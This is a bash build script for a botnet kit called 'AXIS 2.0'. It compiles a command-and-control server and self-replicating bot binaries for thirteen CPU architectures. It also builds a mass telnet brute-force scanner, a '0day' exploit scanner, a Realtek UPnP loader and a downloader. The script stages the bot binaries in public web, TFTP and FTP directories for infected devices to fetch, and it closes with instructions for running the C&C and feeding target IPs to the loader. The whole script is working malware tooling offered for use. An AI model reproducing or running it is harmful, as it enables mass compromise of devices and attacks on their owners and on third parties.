#!/bin/bash

# ============================================================================
# AXIS 2.0 Botnet - Unified Build Script
# ============================================================================
# Builds: C&C server, bot binaries (13 architectures), loaders, scanners
# 
# Requirements:
#   - Go 1.21+ (C&C server, extra scanners)
#   - GCC + cross-compilers (bot binaries)
#   - MySQL/MariaDB (database)
#
# Output: ./bins/, cnc_server, scanListen, loader
# ============================================================================

echo "AXIS 2.0 Botnet Build System"
echo "=============================="
echo ""

# Configuration
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOROOT/bin:$PATH

# Cross-compiler paths (adjust for your system)
XCOMPILE_DIR="/etc/xcompile"

# Architecture toolchains
declare -A ARCH_CC=(
    ["arm"]="arm-linux-gnueabi-gcc"
    ["arm5"]="arm-linux-gnueabi-gcc"
    ["arm6"]="arm-linux-gnueabihf-gcc"
    ["arm7"]="arm-linux-gnueabihf-gcc"
    ["mips"]="mips-linux-gnu-gcc"
    ["mpsl"]="mipsel-linux-gnu-gcc"
    ["x86"]="i686-linux-gnu-gcc"
    ["x86_64"]="x86_64-linux-gnu-gcc"
    ["ppc"]="powerpc-linux-gnu-gcc"
    ["spc"]="sparc-linux-gnu-gcc"
    ["m68k"]="m68k-linux-gnu-gcc"
    ["sh4"]="sh4-linux-gnu-gcc"
    ["arc"]="arc-linux-gnu-gcc"
)

# Create output directories
mkdir -p bins
mkdir -p /var/www/html/bins
mkdir -p /var/lib/tftpboot
mkdir -p /var/ftp
mkdir -p logs

echo "[*] Building C&C Server..."
cd cnc
go mod init production-cnc 2>/dev/null
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords
go build -o ../cnc_server . || { echo "Failed to build C&C"; exit 1; }
cd ..
echo "[+] C&C Server built successfully"

echo ""
echo "[*] Building scanListen..."
cd ..
go build -o scanListen scanListen.go || { echo "Failed to build scanListen"; exit 1; }
echo "[+] scanListen built successfully"

echo ""
echo "[*] Building Extra Scanners (Server-Side)..."
cd extrascanners
go build -o ../extrascanners/telnet-scanner telnet-scanner.go
go build -o ../extrascanners/0day-exploit 0day-exploit.go
go build -o ../extrascanners/realtek-loader realtek-loader.go
chmod +x ../extrascanners/telnet-scanner ../extrascanners/0day-exploit ../extrascanners/realtek-loader ../extrascanners/run-all.sh
cd ..
echo "[+] Extra Scanners built successfully"
echo ""
echo "[*] Extra Scanners location: ./extrascanners/"
echo "    - telnet-scanner   (Mass telnet brute-force)"
echo "    - 0day-exploit     (0-day exploit scanner)"
echo "    - realtek-loader   (Realtek UPnP loader)"
echo "    - run-all.sh       (Run all 3 simultaneously)"

echo ""
echo "[*] Building Bot binaries..."

# Bot build flags
BOT_FLAGS="-DKILLER -DSELFREP -DWATCHDOG"

# Cross-compile for each architecture
for arch in "${!ARCH_CC[@]}"; do
    CC="${ARCH_CC[$arch]}"
    echo "  Building for $arch..."
    
    if command -v $CC &> /dev/null; then
        $CC -std=gnu99 $BOT_FLAGS -Os -o "bins/axis.$arch" bot/*.c 2>/dev/null
        if [ $? -eq 0 ]; then
            # Strip binary
            strip "bins/axis.$arch" 2>/dev/null
            # Copy to web directories
            cp "bins/axis.$arch" /var/www/html/bins/ 2>/dev/null
            cp "bins/axis.$arch" /var/lib/tftpboot/ 2>/dev/null
            cp "bins/axis.$arch" /var/ftp/ 2>/dev/null
            echo "    [+] $arch built successfully"
        else
            echo "    [-] $arch build failed (missing toolchain?)"
        fi
    else
        echo "    [-] $arch compiler not found"
    fi
done

echo ""
echo "[*] Building Loader..."
cd loader
gcc -std=gnu99 -O3 -o ../loader main.c server.c connection.c binary.c telnet_info.c util.c -lpthread 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] Loader built successfully"
else
    echo "[-] Loader build failed"
fi
cd ..

echo ""
echo "[*] Building Downloader (DLR)..."
cd dlr

for arch in "${!ARCH_CC[@]}"; do
    CC="${ARCH_CC[$arch]}"
    echo "  Building DLR for $arch..."
    
    if command -v $CC &> /dev/null; then
        $CC -std=gnu99 -Os -static -nostdlib -o "../bins/dlr.$arch" main.c 2>/dev/null
        if [ $? -eq 0 ]; then
            strip "../bins/dlr.$arch" 2>/dev/null
            cp "../bins/dlr.$arch" /var/www/html/bins/ 2>/dev/null
            echo "    [+] DLR.$arch built"
        fi
    fi
done

cd ..

echo ""
echo "[*] Setting permissions..."
chmod +x cnc_server scanListen loader 2>/dev/null
chmod 777 bins/* /var/www/html/bins/* /var/lib/tftpboot/* /var/ftp/* 2>/dev/null

echo ""
echo "============================================================================"
echo "Build Complete!"
echo "============================================================================"
echo ""
echo "Binaries location: ./bins/"
echo "Web directories: /var/www/html/bins/, /var/lib/tftpboot/, /var/ftp/"
echo ""
echo "To run:"
echo "  1. Set up MySQL database (see README.md)"
echo "  2. ./cnc_server    - Start C&C server"
echo "  3. ./scanListen    - Start scan listener"
echo "  4. ./loader        - Start telnet loader (feed IPs via stdin)"
echo ""
echo "Configuration:"
echo "  - Edit cnc/main.go for database settings"
echo "  - Edit bot/config.h for bot settings"
echo "  - Edit loader/config.h for loader settings"
echo ""
